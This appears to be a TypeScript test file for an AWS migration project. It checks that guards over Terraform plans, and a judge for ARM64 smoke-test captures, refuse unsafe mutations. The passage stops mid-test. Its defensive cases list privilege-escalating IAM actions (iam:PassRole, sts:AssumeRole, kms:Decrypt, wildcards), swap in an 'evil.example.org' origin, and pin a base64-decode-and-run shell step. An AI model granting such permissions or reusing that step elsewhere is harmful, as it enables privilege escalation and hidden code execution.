// server/src/aws/deploy/migration/cost2bMigrationGuards.test.ts
//
// COST-2B: the migration plan guards and the NAT evidence gate, over SYNTHETIC saved plans (planFixtures.ts; committed
// copies in infra/aws/fixtures/migration-plans/). The focus is FALSE ACCEPTANCE: every valid plan passes its own gate and
// no other; every mutation the brief names -- and the near-misses a reviewer would try -- fails, by name. Also pinned:
// the guards' resource lists against the modules they guard (a new ECS-era or single-host resource cannot slip past
// them), the plan-evidence and NAT capture scripts (a stub CLI), the command's evidence binding, and the reconciled
// runbook (it starts from the accepted post-abandonment state and never repeats the recovery unwind).

import { describe, test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "child_process";
import { createHash } from "crypto";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";

import { GATE_NAMES, GATE_TARGETS, GATES, HOST_MULTI, HOST_SINGLETONS, judgeMigrationPlan, TEARDOWN_CLASSES, type GateName, type MigrationContext } from "./planGuards";
import { judgeNatEvidence, NAT_EVIDENCE_FORMAT, NAT_FILES, type NatEvidence } from "./natEvidence";
import { migrationGuardCommand, SAVED_PLAN, SAVED_PLAN_SHA } from "./migrationCommands";
import { ARM64_SMOKE_MIN_PASSED, decodeCapture, judgeArm64LiveSmoke, smokeScriptSha256 } from "./arm64LiveSmoke";
import { readCheckoutText } from "../../../testSupport/portability";
import { FIXTURE, FIXTURE_DIR, fixtureText, HOST_ROLE, hostPolicy, jsonencode, ledgerResourcePolicy, policyDocument, resourceChange, runtimeDocument, signingKeyPolicy, TASK_ROLE, validPlans } from "./planFixtures";

const REPO = path.resolve(__dirname, "../../../../../../.."); // dist/server/src/aws/deploy/migration -> the repository
/* RECON-1A (Windows portability): sources and committed fixtures are read as the repository commits them (LF, no BOM --
   LIVE-6 W1's seam), so the fixture-equality and runbook assertions mean the same on a core.autocrlf=true checkout. */
const read = (rel: string): string => readCheckoutText(path.join(REPO, rel));

type Obj = Record<string, any>; // eslint-disable-line @typescript-eslint/no-explicit-any
const clone = <T>(v: T): T => JSON.parse(JSON.stringify(v)) as T;

const CTX: MigrationContext = { environment: FIXTURE.environment, appAccountId: FIXTURE.appAccountId, servingGeneration: 1, pool: "p1", retiredPools: ["p2"], originDomain: FIXTURE.hostOrigin, minEcrKeepImages: 20, region: FIXTURE.region, ledgerTableArn: FIXTURE.ledgerTableArn, signingKeyArns: FIXTURE.signingKeyArns, ludumOrigins: [FIXTURE.ludumOrigin] };
const PLANS = validPlans();
const plan = (gate: GateName): Obj => clone(PLANS[gate]) as Obj;
const rc = (p: Obj, address: string): Obj => {
  const hit = (p.resource_changes as Obj[]).find((r) => r.address === address);
  assert.ok(hit, `fixture has ${address}`);
  return hit as Obj;
};
const judgeOf = (gate: GateName, p: unknown, ctx: MigrationContext = CTX) => judgeMigrationPlan(gate, p, ctx);
const failed = (r: ReturnType<typeof judgeOf>) => r.checks.filter((c) => c.status === "fail");

/* OWNER-GATE FIX 1: a `gs-host arm64-smoke` capture, as the real Graviton host prints it (arm64-live-smoke.sh framing the
   unchanged image-smoke.sh's lines). Every mutation below is a way a capture could look "good enough" and must not be. */
const RELEASE = `sha256:${"b".repeat(64)}`;
const SMOKE_SHA = smokeScriptSha256(read("infra/aws/modules/single-host/tests/image-smoke.sh"));
const smokeLines = (): string[] => [
  "gs-host: arm64-smoke on i-0123456789abcdef0 (command 11111111-2222-3333-4444-555555555555)",
  "GS-ARM64-LIVE-SMOKE BEGIN",
  `digest=${RELEASE}`,
  "host_arch=aarch64",
  "instance_type=t4g.small",
  "instance_id=i-0123456789abcdef0",
  `smoke_script_sha256=${SMOKE_SHA}`,
  `image=111111111111.dkr.ecr.us-east-1.amazonaws.com/gs-staging-server@${RELEASE}`,
  "image_platform=linux/arm64",
  "ok   [linux/arm64] image metadata is linux/arm64",
  "ok   [linux/arm64] node: arm64 v22.12.0 uid=1000",
  "ok   [linux/arm64] the server starts; GET /gs/healthz -> 200 (read-only root)",
  "ok   [linux/arm64] SIGTERM -> graceful exit 0",
  "ok   [linux/arm64] AWS mode refuses a misspelt metric profile (exit 2, nothing read)",
  "ok   [linux/arm64] AWS mode refuses static credentials in the environment (exit 2)",
  "ok   [linux/arm64] AWS mode (single-host profile) starts and fails ONLY on the absent live runtime document (exit 2, offline)",
  "[linux/arm64] 7 passed, 0 failed",
  "GS-ARM64-LIVE-SMOKE END exit=0",
];
const HOST_ID = "i-0123456789abcdef0";
const smokeJudge = (lines: string[], digest = RELEASE) => judgeArm64LiveSmoke(lines.join("\n"), { digest, smokeSha256: SMOKE_SHA, instanceId: HOST_ID });
const swap = (from: RegExp, to: string) => smokeLines().map((l) => (from.test(l) ? to : l));

describe("OWNER-GATE FIX 1: the live ARM64 runtime smoke judge -- PASS only for a complete arm64 run on Graviton", () => {
  test("a complete Graviton capture PASSES (a Windows CRLF / BOM save tolerated)", () => {
    assert.equal(smokeJudge(smokeLines()).verdict, "PASS", JSON.stringify(smokeJudge(smokeLines()).checks.filter((c) => c.status !== "pass")));
    assert.equal(judgeArm64LiveSmoke(`﻿${smokeLines().join("\r\n")}\r\n`, { digest: RELEASE, smokeSha256: SMOKE_SHA, instanceId: HOST_ID }).verdict, "PASS");
    /* Windows PowerShell 5.1's Tee-Object writes UTF-16LE with a BOM (and big-endian is decoded too): by BOM, it PASSES */
    const utf16 = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(smokeLines().join("\r\n"), "utf16le")]);
    assert.equal(judgeArm64LiveSmoke(decodeCapture(utf16), { digest: RELEASE, smokeSha256: SMOKE_SHA, instanceId: HOST_ID }).verdict, "PASS");
    const be = Buffer.from(smokeLines().join("\n"), "utf16le");
    be.swap16();
    assert.equal(judgeArm64LiveSmoke(decodeCapture(Buffer.concat([Buffer.from([0xfe, 0xff]), be])), { digest: RELEASE, smokeSha256: SMOKE_SHA, instanceId: HOST_ID }).verdict, "PASS");
    assert.equal(ARM64_SMOKE_MIN_PASSED, 7);
  });
  test("incomplete evidence is NOT EVALUATED -- never PASS", () => {
    for (const [lines, why] of [
      [[], "empty"],
      [smokeLines().slice(0, -1), "no END (truncated)"],
      [smokeLines().filter((l) => !/BEGIN/.test(l)), "no BEGIN"],
      [[...smokeLines(), ...smokeLines()], "two runs"],
      [smokeLines().filter((l) => !/ passed, /.test(l)), "no totals"],
      [smokeLines().filter((l) => !/^digest=/.test(l)), "no digest"],
      [smokeLines().filter((l) => !/^smoke_script_sha256=/.test(l)), "no smoke hash"],
      [swap(/^instance_type=/, "instance_type=unknown"), "IMDS unread"],
    ] as Array<[string[], string]>)
      assert.equal(smokeJudge(lines).verdict, "NOT EVALUATED", why);
    assert.equal(judgeArm64LiveSmoke(smokeLines().join("\n"), { digest: RELEASE, smokeSha256: null, instanceId: HOST_ID }).verdict, "NOT EVALUATED", "the repository smoke unreadable");
    assert.equal(smokeJudge(swap(/^instance_id=/, "instance_id=unknown")).verdict, "NOT EVALUATED", "the instance id unread");
  });
  test("every wrong answer is a FAIL: refused, a failed check, x86 / emulated, another digest or smoke script, too few checks, an amd64 run", () => {
    const cases: Array<[string[], RegExp, string?]> = [
      [[...smokeLines().slice(0, 9), "refused=the game server is running: the live ARM64 smoke runs after the push and BEFORE deploy (step 12b)", "GS-ARM64-LIVE-SMOKE END exit=90"], /refused/],
      [swap(/^ok {3}\[linux\/arm64\] SIGTERM/, "FAIL [linux/arm64] graceful stop").map((l) => l.replace("7 passed, 0 failed", "6 passed, 1 failed")).map((l) => l.replace("END exit=0", "END exit=1")), /1 failed/],
      [swap(/^host_arch=/, "host_arch=x86_64"), /not a Graviton host/],
      [swap(/^instance_type=/, "instance_type=t3.small"), /not a Graviton/],
      [swap(/^image_platform=/, "image_platform=linux/amd64"), /linux\/amd64/],
      [smokeLines(), /not the release/, `sha256:${"c".repeat(64)}`],
      [swap(/^smoke_script_sha256=/, `smoke_script_sha256=${"d".repeat(64)}`), /not the repository's/],
      [smokeLines().filter((l) => !/SIGTERM/.test(l)).map((l) => l.replace("7 passed", "6 passed")), /at least 7 required/],
      [smokeLines().map((l) => l.replace(/linux\/arm64\]/g, "linux/amd64]")).map((l) => l.replace("node: arm64", "node: x64")), /ran for linux\/amd64/],
      [swap(/^instance_id=/, "instance_id=i-0fedcba9876543210"), /not the single host/],
      [swap(/END exit=0/, "GS-ARM64-LIVE-SMOKE END exit=1"), /exit status/],
    ];
    for (const [lines, why, digest] of cases) {
      const j = smokeJudge(lines, digest);
      assert.equal(j.verdict, "FAIL", `${why}: ${JSON.stringify(j.checks.filter((c) => c.status !== "pass"))}`);
      assert.ok(j.checks.some((c) => c.status === "fail" && why.test(`${c.name}: ${c.detail}`)), String(why));
    }
  });
  test("the host wrapper and gs-host twins carry exactly this protocol (and run the UNCHANGED image-smoke.sh)", () => {
    const wrapper = read("infra/aws/single-host/arm64-live-smoke.sh");
    for (const marker of ["GS-ARM64-LIVE-SMOKE BEGIN", "GS-ARM64-LIVE-SMOKE END exit=%s", "digest=%s", "host_arch=%s", "instance_type=%s", "smoke_script_sha256=%s", "image_platform=%s", 'bash "$smoke" "$ref" linux/arm64', "systemctl is-active --quiet gs-server.service", "take_lock", 'pull_release "$digest"']) assert.ok(wrapper.includes(marker), marker);
    for (const twin of ["infra/aws/single-host/gs-host.ps1", "infra/aws/single-host/gs-host.sh"]) {
      const t = read(twin);
      assert.match(t, /arm64-smoke/);
      assert.ok(t.includes("arm64-live-smoke.sh") && /modules[\\/]single-host[\\/]tests[\\/]image-smoke\.sh/.test(t), twin);
      assert.match(t, /printf %s \$wrapper \| base64 -d > `?\\?\$d\/w && printf %s \$smoke \| base64 -d > `?\\?\$d\/s && bash `?\\?\$d\/w/, twin);
    }
  });
});

/** The plan FAILS the gate, and a failing check's name or detail matches `why`. */
function rejects(gate: GateName, p: unknown, why: RegExp, ctx: MigrationContext = CTX): void {
  const r = judgeOf(gate, p, ctx);
  assert.equal(r.verdict, "FAIL", `${gate} must refuse this plan`);
  const text = failed(r).map((c) => `${c.name}: ${c.detail}`);
  assert.ok(text.some((t) => why.test(t)), `${gate}: a failure matching ${why} expected; got:\n  ${text.join("\n  ")}`);
}

const A = "module.app";
const L = "module.ledger";
const H = "module.host";

/* ------------------------------------------------------------------ */

describe("COST-2B fixtures: the committed synthetic plans are the builder's", () => {
  for (const gate of GATE_NAMES) {
    test(`${FIXTURE_DIR}/${gate}.json`, () => {
      assert.equal(read(`${FIXTURE_DIR}/${gate}.json`), fixtureText(PLANS[gate] as Obj), "regenerate: node dist/server/src/aws/deploy/migration/planFixtures.js --write");
    });
  }
  test("no other fixture file", () => {
    assert.deepEqual(fs.readdirSync(path.join(REPO, FIXTURE_DIR)).filter((f) => f.endsWith(".json")).sort(), GATE_NAMES.map((g) => `${g}.json`).sort());
  });
});

describe("COST-2B valid plans: each passes its own gate and NO other", () => {
  for (const gate of GATE_NAMES) {
    test(`valid ${gate} plan PASSES`, () => {
      const r = judgeOf(gate, plan(gate));
      assert.equal(r.verdict, "PASS", failed(r).map((c) => `${c.name}: ${c.detail}`).join("\n"));
    });
    for (const other of GATE_NAMES.filter((g) => g !== gate)) {
      test(`the ${gate} plan is refused as ${other}`, () => {
        assert.equal(judgeOf(other, plan(gate)).verdict, "FAIL");
      });
    }
  }
  test("the edge-cutover gate needs the target named, and judges against it", () => {
    rejects("edge-cutover", plan("edge-cutover"), /target origin is named/, { ...CTX, originDomain: undefined });
    rejects("edge-cutover", plan("edge-cutover"), /would point at gs-origin-host\.example\.org, not gs-origin-other\.example\.org/, { ...CTX, originDomain: "gs-origin-other.example.org" });
  });
});

describe("COST-2B: plans Terraform itself produced (terraform-real/, moto-backed) pass their gate, and only it", () => {
  const REAL: ReadonlyArray<[GateName, string]> = [
    ["host-create", "123456789012"],
    ["ledger-host-authorize", FIXTURE.appAccountId],
    ["ledger-task-deauthorize", FIXTURE.appAccountId],
  ];
  const real = (gate: GateName): Obj => JSON.parse(read(`${FIXTURE_DIR}/terraform-real/${gate}.json`)) as Obj;
  for (const [gate, account] of REAL) {
    const ctx = { ...CTX, appAccountId: account };
    test(`real ${gate} PASSES`, () => {
      const r = judgeOf(gate, real(gate), ctx);
      assert.equal(r.verdict, "PASS", failed(r).map((c) => `${c.name}: ${c.detail}`).join("\n"));
    });
    test(`real ${gate} is refused by every other gate`, () => {
      for (const other of GATE_NAMES.filter((g) => g !== gate)) assert.equal(judgeOf(other, real(gate), ctx).verdict, "FAIL", other);
    });
  }
  test("mutations of the real plans are refused", () => {
    const ctx = { ...CTX, appAccountId: "123456789012" };
    const twice = real("host-create");
    const host = (twice.resource_changes as Obj[]).find((r) => r.address === `${H}.aws_instance.host`)!;
    (twice.resource_changes as Obj[]).push({ ...clone(host), address: `${H}.aws_instance.spare`, name: "spare" });
    rejects("host-create", twice, /one host, one Elastic IP/, ctx);
    const pol = real("host-create");
    const p = (pol.resource_changes as Obj[]).find((r) => r.address === `${H}.aws_iam_role_policy.host`)!;
    p.change.after.policy = String(p.change.after.policy).replace("gs-staging-game-g1", "gs-staging-game-g2");
    rejects("host-create", pol, /reaches table gs-staging-game-g2/, ctx);
    /* the real ledger change with the task role dropped in one statement */
    const coexist = real("ledger-host-authorize");
    const rp = (coexist.resource_changes as Obj[]).find((r) => r.type === "aws_dynamodb_resource_policy")!;
    const doc = JSON.parse(rp.change.after.policy);
    const st = doc.Statement.find((s: Obj) => s.Sid === "AppTaskLedgerPutNeverAppgen");
    st.Condition.ArnEquals["aws:PrincipalArn"] = HOST_ROLE;
    rp.change.after.policy = JSON.stringify(doc);
    rejects("ledger-host-authorize", coexist, /AppTaskLedgerPutNeverAppgen: the only change allowed/);
  });
});

/* ------------------------------------------------------------------ */

describe("COST-2B required mutations", () => {
  test("table destroy: g1 in the teardown, the ledger in the host-authorisation", () => {
    const p = plan("compute-none");
    Object.assign(rc(p, `${A}.aws_dynamodb_table.game["1"]`).change, { actions: ["delete"], after: null });
    rejects("compute-none", p, /ABSOLUTELY FORBIDDEN/);
    const q = plan("ledger-host-authorize");
    Object.assign(rc(q, `${L}.aws_dynamodb_table.ledger`).change, { actions: ["delete"], after: null });
    rejects("ledger-host-authorize", q, /the ledger table: never replaced/);
  });

  test("table replace: the ledger (a renamed table), the identity table", () => {
    const p = plan("ledger-host-authorize");
    const t = rc(p, `${L}.aws_dynamodb_table.ledger`);
    Object.assign(t.change, { actions: ["delete", "create"] });
    t.action_reason = "replace_because_cannot_update";
    rejects("ledger-host-authorize", p, /the ledger table: never replaced/);
    const q = plan("compute-none");
    Object.assign(rc(q, `${A}.aws_dynamodb_table.identity`).change, { actions: ["create", "delete"] });
    rejects("compute-none", q, /ABSOLUTELY FORBIDDEN/);
    rejects("compute-none", q, /nothing created/);
  });

  test("KMS replace (and create, and delete) in the ledger plans", () => {
    for (const gate of ["ledger-host-authorize", "ledger-task-deauthorize"] as const) {
      const p = plan(gate);
      Object.assign(rc(p, `${L}.aws_kms_key.signing["relayer"]`).change, { actions: ["delete", "create"] });
      rejects(gate, p, /KMS: no key created, destroyed or replaced/);
      const q = plan(gate);
      (q.resource_changes as Obj[]).push(resourceChange({ module: L, type: "aws_kms_key", name: "signing", index: "relayer-r2", actions: ["create"], before: null, after: { policy: signingKeyPolicy([TASK_ROLE, HOST_ROLE]) } }));
      rejects(gate, q, /KMS: no key created/);
      const d = plan(gate);
      Object.assign(rc(d, `${L}.aws_kms_key.signing["admission"]`).change, { actions: ["delete"], after: null });
      rejects(gate, d, /KMS: no key created, destroyed or replaced/);
    }
  });

  test("CloudFront replace", () => {
    const p = plan("edge-cutover");
    Object.assign(rc(p, `${A}.aws_cloudfront_distribution.site[0]`).change, { actions: ["delete", "create"] });
    rejects("edge-cutover", p, /updated in place, never replaced/);
    const q = plan("compute-none");
    Object.assign(rc(q, `${A}.aws_cloudfront_distribution.site[0]`).change, { actions: ["create", "delete"] });
    rejects("compute-none", q, /ABSOLUTELY FORBIDDEN/);
  });

  test("unexpected default-origin change", () => {
    const p = plan("edge-cutover");
    const site = (rc(p, `${A}.aws_cloudfront_distribution.site[0]`).change.after.origin as Obj[]).find((o) => o.origin_id === "site")!;
    site.domain_name = "evil.example.org";
    rejects("edge-cutover", p, /the DEFAULT \(site\) origin changes/);
    const q = plan("edge-cutover");
    rc(q, `${A}.aws_cloudfront_distribution.site[0]`).change.after.default_cache_behavior[0].target_origin_id = "gs-alb";
    rejects("edge-cutover", q, /the default behaviour/);
  });

  test("p1 runtime document deletion (and replacement)", () => {
    for (const actions of [["delete"], ["delete", "create"], ["forget"]]) {
      const p = plan("compute-none");
      Object.assign(rc(p, `${A}.aws_ssm_parameter.runtime["p1"]`).change, { actions, after: actions.includes("create") ? rc(p, `${A}.aws_ssm_parameter.runtime["p1"]`).change.after : null });
      rejects("compute-none", p, /ABSOLUTELY FORBIDDEN|runtime document is/);
    }
  });

  test("a second EC2 host (and a second Elastic IP)", () => {
    const p = plan("host-create");
    const host = clone(rc(p, `${H}.aws_instance.host`));
    (p.resource_changes as Obj[]).push({ ...host, address: `${H}.aws_instance.standby`, name: "standby" });
    rejects("host-create", p, /one host, one Elastic IP/);
    rejects("host-create", p, /aws_instance\.standby \[create\]: NOT PART OF THIS STEP/);
    const q = plan("host-create");
    (q.resource_changes as Obj[]).push(resourceChange({ module: H, type: "aws_eip", name: "spare", actions: ["create"], before: null, after: { domain: "vpc" } }));
    rejects("host-create", q, /one host, one Elastic IP/);
    const c = plan("host-create");
    rc(c, `${H}.aws_instance.host`).index = 1;
    (c.resource_changes as Obj[]).push({ ...clone(rc(c, `${H}.aws_instance.host`)), address: `${H}.aws_instance.host[1]` });
    rejects("host-create", c, /one host/);
  });

  test("ALB creation: beside the host, and as a 'teardown' that recreates one", () => {
    const p = plan("host-create");
    (p.resource_changes as Obj[]).push(resourceChange({ module: H, type: "aws_lb", name: "front", actions: ["create"], before: null, after: { load_balancer_type: "application" } }));
    rejects("host-create", p, /no authority, ECS-era or duplicate resource/);
    const q = plan("compute-none");
    Object.assign(rc(q, `${A}.aws_lb.this[0]`).change, { actions: ["delete", "create"], after: { name: "gs-staging-alb" } });
    rejects("compute-none", q, /only DESTROYED here/);
    rejects("compute-none", q, /nothing created/);
    const e = plan("edge-cutover");
    (e.resource_changes as Obj[]).push(resourceChange({ module: A, type: "aws_lb", name: "this", index: 1, actions: ["create"], before: null, after: {} }));
    rejects("edge-cutover", e, /NOT PART OF THIS STEP/);
  });

  test("an ECS restart hidden in a 'recovery' plan is refused by every gate", () => {
    /* The OLD runbook's step A.1 shape: the 'unchanged generation-1' app apply that unwinds the recovery access -- with the
       legacy desired-count drift corrected in passing: p1 AND p2 back to 1. */
    const recovery = plan("ecs-rollback");
    Object.assign(rc(recovery, `${A}.aws_ecs_service.pool["p2"]`).change, { actions: ["update"], after: { ...rc(recovery, `${A}.aws_ecs_service.pool["p2"]`).change.after, desired_count: 1 } });
    (recovery.resource_changes as Obj[]).push(resourceChange({ module: A, type: "aws_iam_role_policy", name: "recovery", index: 0, actions: ["update"], before: { policy: policyDocument([{ Sid: "BreakGlassRestoreToPointInTime", Action: ["dynamodb:RestoreTableToPointInTime"], Resource: ["*"] }]) }, after: { policy: policyDocument([{ Sid: "IdentityTablesReplay", Action: ["dynamodb:GetItem"], Resource: ["*"] }]) } }));
    recovery.variables.recovery_break_glass = { value: false };
    for (const gate of GATE_NAMES) assert.equal(judgeOf(gate, recovery).verdict, "FAIL", `${gate} accepted the recovery-shaped restart`);
    rejects("ecs-rollback", recovery, /the retired pool\(s\) stay drained/);
    rejects("ecs-rollback", recovery, /aws_iam_role_policy\.recovery\[0\] \[update\]: NOT PART OF THIS STEP/);
    /* The same restart riding along with the cutover: named as the drift. */
    const cut = plan("edge-cutover");
    (cut.resource_changes as Obj[]).push(clone(rc(plan("ecs-rollback"), `${A}.aws_ecs_service.pool["p1"]`)));
    cut.resource_drift = plan("ecs-rollback").resource_drift;
    rejects("edge-cutover", cut, /would RESTART module\.app\.aws_ecs_service\.pool\["p1"\].*take POOL#p1 back/);
    rejects("edge-cutover", cut, /desired 1 -> live 0/);
    /* ... and riding along with the teardown (an update instead of the destroy). */
    const td = plan("compute-none");
    Object.assign(rc(td, `${A}.aws_ecs_service.pool["p1"]`).change, { actions: ["update"], before: rc(plan("ecs-rollback"), `${A}.aws_ecs_service.pool["p1"]`).change.before, after: rc(plan("ecs-rollback"), `${A}.aws_ecs_service.pool["p1"]`).change.after });
    rejects("compute-none", td, /ECS: destroyed, never restarted/);
    rejects("compute-none", td, /every ECS-era object in the state is destroyed/);
  });

  test("an unknown destructive resource fails closed", () => {
    const p = plan("compute-none");
    (p.resource_changes as Obj[]).push(resourceChange({ module: A, type: "aws_s3_bucket", name: "evidence", actions: ["delete"], before: { bucket: "gs-staging-evidence" }, after: null }));
    rejects("compute-none", p, /aws_s3_bucket\.evidence \[delete\]: NOT PART OF THIS STEP/);
    for (const gate of ["ledger-host-authorize", "host-create", "ecr-lifecycle", "edge-cutover", "ecs-rollback"] as const) {
      const q = plan(gate);
      const m = GATES[gate].stack === "ledger" ? L : GATES[gate].stack === "app" ? A : H;
      (q.resource_changes as Obj[]).push(resourceChange({ module: m, type: "aws_route53_record", name: "x", actions: ["delete"], before: { name: "x" }, after: null }));
      rejects(gate, q, /NOT PART OF THIS STEP/);
    }
    const u = plan("compute-none");
    Object.assign(rc(u, `${A}.aws_lb.this[0]`).change, { actions: ["delete", "create", "forget"] });
    rejects("compute-none", u, /every action understood/);
  });
});

/* ------------------------------------------------------------------ */

describe("COST-2B false-negative probes: the ledger's runtime principals", () => {
  const ledgerUpdate = (p: Obj, address: string, policy: string) => {
    rc(p, address).change.after.policy = policy;
  };
  const RP = `${L}.aws_dynamodb_resource_policy.ledger`;

  test("the host added to a NON-runtime statement (bootstrap's APPGEN write) is refused", () => {
    const p = plan("ledger-host-authorize");
    const doc = JSON.parse(ledgerResourcePolicy([TASK_ROLE, HOST_ROLE]));
    doc.Statement.find((s: Obj) => s.Sid === "BootstrapAppgenOnly").Condition.ArnEquals["aws:PrincipalArn"] = [`arn:aws:iam::${FIXTURE.appAccountId}:role/gs-staging-bootstrap`, HOST_ROLE];
    ledgerUpdate(p, RP, JSON.stringify(doc));
    rejects("ledger-host-authorize", p, /BootstrapAppgenOnly is not a runtime statement/);
  });

  test("the task role dropped during coexistence is refused", () => {
    const p = plan("ledger-host-authorize");
    ledgerUpdate(p, RP, ledgerResourcePolicy([HOST_ROLE]));
    rejects("ledger-host-authorize", p, /the only change allowed is .*host-app added beside .*app-task/);
    const k = plan("ledger-host-authorize");
    ledgerUpdate(k, `${L}.aws_kms_key.signing["settlement"]`, signingKeyPolicy([HOST_ROLE]));
    rejects("ledger-host-authorize", k, /signing\["settlement"\].*host-app added beside/);
    const v = plan("ledger-host-authorize");
    v.variables.ecs_task_role_authorized = { value: false };
    rejects("ledger-host-authorize", v, /variables: exactly the host role; the task role kept/);
  });

  test("another role, a wildcard, or a widened action is refused", () => {
    for (const intruder of [`arn:aws:iam::${FIXTURE.appAccountId}:role/gs-staging-host-app2`, `arn:aws:iam::${FIXTURE.appAccountId}:role/*`, `arn:aws:iam::${FIXTURE.appAccountId}:role/gs-staging-operator`]) {
      const p = plan("ledger-host-authorize");
      ledgerUpdate(p, RP, ledgerResourcePolicy([TASK_ROLE, HOST_ROLE, intruder]));
      rejects("ledger-host-authorize", p, /the only change allowed/);
    }
    const w = plan("ledger-host-authorize");
    const doc = JSON.parse(signingKeyPolicy([TASK_ROLE, HOST_ROLE]));
    doc.Statement.find((s: Obj) => s.Sid === "AppTaskSignDigestOnly").Action = ["kms:Sign", "kms:CreateGrant"];
    ledgerUpdate(w, `${L}.aws_kms_key.signing["relayer"]`, JSON.stringify(doc));
    rejects("ledger-host-authorize", w, /AppTaskSignDigestOnly: the only change allowed/);
    const c = plan("ledger-host-authorize");
    const d2 = JSON.parse(signingKeyPolicy([TASK_ROLE, HOST_ROLE]));
    delete d2.Statement.find((s: Obj) => s.Sid === "AppTaskSignDigestOnly").Condition.StringEquals;
    ledgerUpdate(c, `${L}.aws_kms_key.signing["relayer"]`, JSON.stringify(d2));
    rejects("ledger-host-authorize", c, /AppTaskSignDigestOnly/);
    const n = plan("ledger-host-authorize");
    const d3 = JSON.parse(ledgerResourcePolicy([TASK_ROLE, HOST_ROLE]));
    d3.Statement.push({ Sid: "Extra", Effect: "Allow", Action: "dynamodb:*", Resource: "*", Principal: { AWS: "*" } });
    ledgerUpdate(n, RP, JSON.stringify(d3));
    rejects("ledger-host-authorize", n, /statements added or removed/);
  });

  test("a key left behind, an unknown policy, an extra attribute change", () => {
    const p = plan("ledger-host-authorize");
    Object.assign(rc(p, `${L}.aws_kms_key.signing["admission"]`).change, { actions: ["no-op"], after: rc(p, `${L}.aws_kms_key.signing["admission"]`).change.before });
    rejects("ledger-host-authorize", p, /every signing key's policy changes with it/);
    const u = plan("ledger-host-authorize");
    rc(u, RP).change.after.policy = null;
    rc(u, RP).change.after_unknown = { revision_id: true, policy: true };
    rejects("ledger-host-authorize", u, /policy unknown until apply/);
    const m = plan("ledger-host-authorize");
    rc(m, `${L}.aws_kms_key.signing["relayer"]`).change.after.multi_region = true;
    rejects("ledger-host-authorize", m, /also changes multi_region/);
    const s = plan("ledger-host-authorize");
    rc(s, `${L}.aws_kms_key.signing["relayer"]`).change.after.is_enabled = false;
    rejects("ledger-host-authorize", s, /also changes is_enabled/);
  });

  test("a TARGETED plan that leaves a signing key out is refused (the keys come from the state, not the plan)", () => {
    const p = plan("ledger-host-authorize");
    p.resource_changes = (p.resource_changes as Obj[]).filter((r) => r.address !== `${L}.aws_kms_key.signing["admission"]`);
    rejects("ledger-host-authorize", p, /signing\["admission"\] \[not in the plan\].*refused Sign/);
    const q = plan("ledger-host-authorize");
    delete q.prior_state;
    rejects("ledger-host-authorize", q, /cannot see which signing keys exist/);
  });

  test("APPGEN, backup and the deauthorisation's mirror", () => {
    const p = plan("ledger-host-authorize");
    (p.resource_changes as Obj[]).push(resourceChange({ module: L, type: "aws_dynamodb_table_item", name: "appgen", actions: ["create"], before: null, after: { item: JSON.stringify({ pk: { S: "APPGEN" }, sk: { S: "APPGEN" }, current_generation: { N: "2" } }) } }));
    rejects("ledger-host-authorize", p, /APPGEN: never a Terraform item/);
    const b = plan("ledger-host-authorize");
    Object.assign(rc(b, `${L}.aws_backup_vault_lock_configuration.ledger`).change, { actions: ["delete"], after: null });
    rejects("ledger-host-authorize", b, /AWS Backup: untouched/);
    const sel = plan("ledger-task-deauthorize");
    Object.assign(rc(sel, `${L}.aws_backup_selection.ledger`).change, { actions: ["update"], after: { ...rc(sel, `${L}.aws_backup_selection.ledger`).change.before, resources: [] } });
    rejects("ledger-task-deauthorize", sel, /AWS Backup: untouched/);
    /* deauthorize: the HOST removed instead of the task -- the money would stop. */
    const wrong = plan("ledger-task-deauthorize");
    rc(wrong, RP).change.after.policy = ledgerResourcePolicy([TASK_ROLE]);
    rejects("ledger-task-deauthorize", wrong, /the only change allowed is .*app-task removed while .*host-app stays/);
    const half = plan("ledger-task-deauthorize");
    rc(half, `${L}.aws_kms_key.signing["relayer"]`).change.after.policy = signingKeyPolicy([TASK_ROLE, HOST_ROLE]);
    Object.assign(rc(half, `${L}.aws_kms_key.signing["relayer"]`).change, { actions: ["no-op"] });
    rejects("ledger-task-deauthorize", half, /every signing key's policy changes with it/);
  });
});

describe("COST-2B false-negative probes: the host", () => {
  const POLICY = `${H}.aws_iam_role_policy.host`;
  test("the host role reaching g2, or holding forbidden authority, is refused", () => {
    const g2 = plan("host-create");
    rc(g2, POLICY).change.after.policy = hostPolicy(["gs-staging-game-g1", "gs-staging-game-g2"]);
    rejects("host-create", g2, /reaches table gs-staging-game-g2/);
    rejects("host-create", g2, /g1 serves; every other generation stays inert/);
    for (const action of ["iam:PassRole", "sts:AssumeRole", "kms:CreateGrant", "kms:Decrypt", "dynamodb:DeleteTable", "dynamodb:RestoreTableToPointInTime", "ssm:PutParameter", "ecr:PutImage", "dynamodb:*", "*", "ec2:TerminateInstances", "logs:DeleteLogGroup"]) {
      const p = plan("host-create");
      const doc = JSON.parse(hostPolicy());
      doc.Statement[0].Action.push(action);
      rc(p, POLICY).change.after.policy = JSON.stringify(doc);
      rejects("host-create", p, new RegExp(`GameTableReadAndCheck: ${action.replace(/[*.]/g, (c) => `\\${c}`)}`));
    }
  });
  test("SYSTEM / APPGEN exclusions and the digest-only Sign are required", () => {
    const sys = plan("host-create");
    const d1 = JSON.parse(hostPolicy());
    delete d1.Statement.find((s: Obj) => s.Sid === "GameTableWriteNeverSystem").Condition;
    rc(sys, POLICY).change.after.policy = JSON.stringify(d1);
    rejects("host-create", sys, /without excluding SYSTEM/);
    const ag = plan("host-create");
    const d2 = JSON.parse(hostPolicy());
    d2.Statement.find((s: Obj) => s.Sid === "LedgerAppendNeverAppgen").Condition["ForAllValues:StringNotEquals"]["dynamodb:LeadingKeys"] = ["APPGEN"];
    rc(ag, POLICY).change.after.policy = JSON.stringify(d2);
    rejects("host-create", ag, /does not exclude APPGEN and APPGEN#HISTORY/);
    const sg = plan("host-create");
    const d3 = JSON.parse(hostPolicy());
    delete d3.Statement.find((s: Obj) => s.Sid === "SigningKeysSignDigestOnly").Condition;
    rc(sg, POLICY).change.after.policy = JSON.stringify(d3);
    rejects("host-create", sg, /kms:Sign without the DIGEST/);
    const unk = plan("host-create");
    rc(unk, POLICY).change.after.policy = null;
    rejects("host-create", unk, /unknown at plan time/);
  });
  test("IMDSv1, a wrong role name, a missing budget, the ECR lifecycle too early, a replacement", () => {
    const md = plan("host-create");
    rc(md, `${H}.aws_instance.host`).change.after.metadata_options[0].http_tokens = "optional";
    rejects("host-create", md, /IMDSv2 is not required/);
    const nm = plan("host-create");
